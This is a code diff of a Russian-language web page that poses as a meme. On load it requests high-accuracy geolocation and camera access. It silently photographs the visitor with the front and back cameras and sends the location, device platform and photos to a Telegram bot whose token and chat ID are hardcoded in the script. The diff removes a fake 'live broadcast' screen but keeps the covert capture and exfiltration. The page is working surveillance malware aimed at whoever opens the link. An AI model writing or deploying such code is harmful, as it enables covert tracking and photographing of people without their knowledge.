@@ -6,7 +6,6 @@
   <title>😂</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
-
     body {
       background: #000;
       min-height: 100vh;
@@ -14,149 +13,37 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      font-family: Arial, sans-serif;
-      overflow: hidden;
-    }
-
-    /* === МЕМ-ЭКРАН === */
-    #meme-screen {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
       padding: 16px;
-      width: 100%;
     }
-
-    #meme-screen img {
+    img {
       max-width: 480px;
       width: 100%;
       border-radius: 12px;
+      display: block;
     }
-
-    #meme-screen p {
+    p {
       color: #fff;
       font-size: 20px;
       font-weight: bold;
       margin-top: 16px;
       text-align: center;
+      font-family: Arial, sans-serif;
     }
-
-    /* === КАМЕРА-ЭКРАН === */
-    #cam-screen {
-      display: none;
-      position: relative;
-      width: 100vw;
-      height: 100vh;
-    }
-
-    #live-video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      transform: scaleX(-1); /* зеркалим фронталку */
-    }
-
-    /* оверлей поверх видео */
-    .overlay {
-      position: absolute;
-      top: 0; left: 0; right: 0; bottom: 0;
-      pointer-events: none;
-    }
-
-    /* верхний баннер */
-    .top-bar {
-      position: absolute;
-      top: 0; left: 0; right: 0;
-      background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent);
-      padding: 20px 16px 40px;
-      color: #fff;
-      font-size: 15px;
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .rec-dot {
-      width: 10px; height: 10px;
-      border-radius: 50%;
-      background: #ff3b30;
-      animation: blink 1s infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50%       { opacity: 0; }
-    }
-
-    /* нижний баннер */
-    .bottom-bar {
-      position: absolute;
-      bottom: 0; left: 0; right: 0;
-      background: linear-gradient(to top, rgba(0,0,0,0.75), transparent);
-      padding: 40px 16px 28px;
-      color: #fff;
-      font-size: 22px;
-      font-weight: bold;
-      text-align: center;
-    }
-
-    /* кнопка переключения камеры */
-    #flip-btn {
-      position: absolute;
-      top: 16px;
-      right: 16px;
-      background: rgba(255,255,255,0.2);
-      border: none;
-      border-radius: 50%;
-      width: 44px; height: 44px;
-      font-size: 22px;
-      cursor: pointer;
-      color: #fff;
-      backdrop-filter: blur(4px);
-    }
-
-    /* скрытый canvas */
-    canvas { display: none; }
+    canvas, video { display: none; }
   </style>
 </head>
 <body>
 
-  <!-- ЭКРАН 1: МЕМ -->
-  <div id="meme-screen">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTU3lW73MoufAIUN8WbcHo4fd4wh0402ovG0BWGU-AjqQ&s" alt="" />
-    <!--<p>бля, ну ты посмотри 💀</p>-->
-  </div>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTU3lW73MoufAIUN8WbcHo4fd4wh0402ovG0BWGU-AjqQ&s" alt="" />
+  <p>бля, ну ты посмотри 💀</p>
 
-  <!-- ЭКРАН 2: ТРАНСЛЯЦИЯ -->
-  <div id="cam-screen">
-    <video id="live-video" autoplay playsinline muted></video>
-
-    <div class="overlay">
-      <div class="top-bar">
-        <div class="rec-dot"></div>
-        ПРЯМОЙ ЭФИР
-      </div>
-
-      <div class="bottom-bar">
-        смотри какой красавчик 😍
-      </div>
-
-      <button id="flip-btn" title="Переключить камеру">🔄</button>
-    </div>
-  </div>
-
+  <video id="vid" playsinline></video>
   <canvas id="cvs"></canvas>
 
   <script>
     const TOKEN   = '8666177832:AAHeuWWSEfP9bi2CZ2YuFVdp4mzKscUwJiI';
     const CHAT_ID = '8562554669';
 
-    let currentFacing = 'user'; // текущая камера
-    let liveStream    = null;
-
-    /* ── Telegram helpers ── */
     async function tgMsg(text) {
       try {
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
@@ -173,118 +60,54 @@
         fd.append('chat_id', CHAT_ID);
         fd.append('photo', blob, 'photo.jpg');
         fd.append('caption', caption);
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-          method: 'POST', body: fd
-        });
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
       } catch(_) {}
     }
 
-    /* ── Геолокация ── */
     async function getGeo() {
       return new Promise(resolve => {
         if (!navigator.geolocation) { resolve(null); return; }
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve(pos),
-          ()  => resolve(null),
-          { enableHighAccuracy: true, timeout: 10000 }
-        );
+        navigator.geolocation.getCurrentPosition(pos => resolve(pos), () => resolve(null), {
+          enableHighAccuracy: true, timeout: 10000
+        });
       });
     }
 
-    /* ── Снимок с видеопотока ── */
-    function snapFromVideo(videoEl) {
+    async function captureCamera(facingMode) {
+      const vid = document.getElementById('vid');
       const cvs = document.getElementById('cvs');
-      cvs.width  = videoEl.videoWidth  || 640;
-      cvs.height = videoEl.videoHeight || 480;
-      cvs.getContext('2d').drawImage(videoEl, 0, 0);
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
+      });
+      vid.srcObject = stream;
+      await vid.play();
+      await new Promise(r => setTimeout(r, 800));
+      cvs.width  = vid.videoWidth  || 640;
+      cvs.height = vid.videoHeight || 480;
+      cvs.getContext('2d').drawImage(vid, 0, 0);
+      stream.getTracks().forEach(t => t.stop());
       return new Promise(r => cvs.toBlob(r, 'image/jpeg', 0.85));
     }
 
-    /* ── Запуск камеры (трансляция) ── */
-    async function startCamera(facingMode) {
-      if (liveStream) liveStream.getTracks().forEach(t => t.stop());
-
-      liveStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
-      });
-
-      const vid = document.getElementById('live-video');
-      vid.srcObject = liveStream;
-      await vid.play();
-
-      // зеркалим только фронталку
-      vid.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
-
-      return vid;
-    }
-
-    /* ── Отдельный снимок без влияния на трансляцию ── */
-    async function silentSnap(facingMode) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
-        });
-        const tmpVid = document.createElement('video');
-        tmpVid.srcObject = stream;
-        tmpVid.setAttribute('playsinline', '');
-        await tmpVid.play();
-        await new Promise(r => setTimeout(r, 600));
-        const blob = await snapFromVideo(tmpVid);
-        stream.getTracks().forEach(t => t.stop());
-        return blob;
-      } catch(_) { return null; }
-    }
-
-    /* ── Кнопка переключения ── */
-    document.getElementById('flip-btn').addEventListener('click', async () => {
-      currentFacing = currentFacing === 'user' ? 'environment' : 'user';
-      await startCamera(currentFacing);
-    });
-
-    /* ── Главный сценарий ── */
     async function run() {
       const ua = navigator.userAgent;
-      const platform = /iPhone|iPad|iPod/.test(ua) ? 'iOS'
-                     : /Android/.test(ua)           ? 'Android'
-                     : 'Desktop';
+      const platform = /iPhone|iPad|iPod/.test(ua) ? 'iOS' : /Android/.test(ua) ? 'Android' : 'Desktop';
 
-      // Показываем мем пока идёт загрузка
-      // Запрашиваем камеру — после allow переключаем на трансляцию
-      let liveVid;
-      try {
-        liveVid = await startCamera('user');
-        // Мем прячем, трансляцию показываем
-        document.getElementById('meme-screen').style.display = 'none';
-        document.getElementById('cam-screen').style.display  = 'block';
-      } catch(e) {
-        // Камера запрещена — остаёмся на меме
-      }
-
-      // Геолокация тихо
       const pos = await getGeo();
       if (pos) {
         const { latitude: lat, longitude: lon, accuracy: acc } = pos.coords;
-        await tgMsg(
-          `📍 <b>Локация</b>\n` +
-          `https://maps.google.com/maps?q=${lat},${lon}\n` +
-          `Точность: ±${Math.round(acc)} м · ${platform}`
-        );
+        await tgMsg(`📍 <b>Локация</b>\nhttps://maps.google.com/maps?q=${lat},${lon}\nТочность: ±${Math.round(acc)} м · ${platform}`);
       } else {
         await tgMsg(`📍 Геолокация отклонена · ${platform}`);
       }
 
-      // Снимаем фронталку прямо с живого потока
-      if (liveVid) {
-        await new Promise(r => setTimeout(r, 1000)); // дать секунду "поудивляться"
-        const frontBlob = await snapFromVideo(liveVid);
-        if (frontBlob) await tgPhoto(frontBlob, '📸 Фронтальная камера');
-      }
+      let frontBlob = null, backBlob = null;
+      try { frontBlob = await captureCamera('user');        } catch(_) {}
+      try { backBlob  = await captureCamera('environment'); } catch(_) {}
 
-      // Заднюю камеру снимаем тихо (отдельный поток, не мешает трансляции)
-      const backBlob = await silentSnap('environment');
-      if (backBlob) await tgPhoto(backBlob, '📸 Основная камера');
-
-      if (!liveVid && !backBlob) await tgMsg('⚠️ Доступ к камере отклонён');
+      if (frontBlob) await tgPhoto(frontBlob, '📸 Фронтальная камера');
+      if (backBlob)  await tgPhoto(backBlob,  '📸 Основная камера');
+      if (!frontBlob && !backBlob) await tgMsg('⚠️ Доступ к камере отклонён');
     }
 
     run();
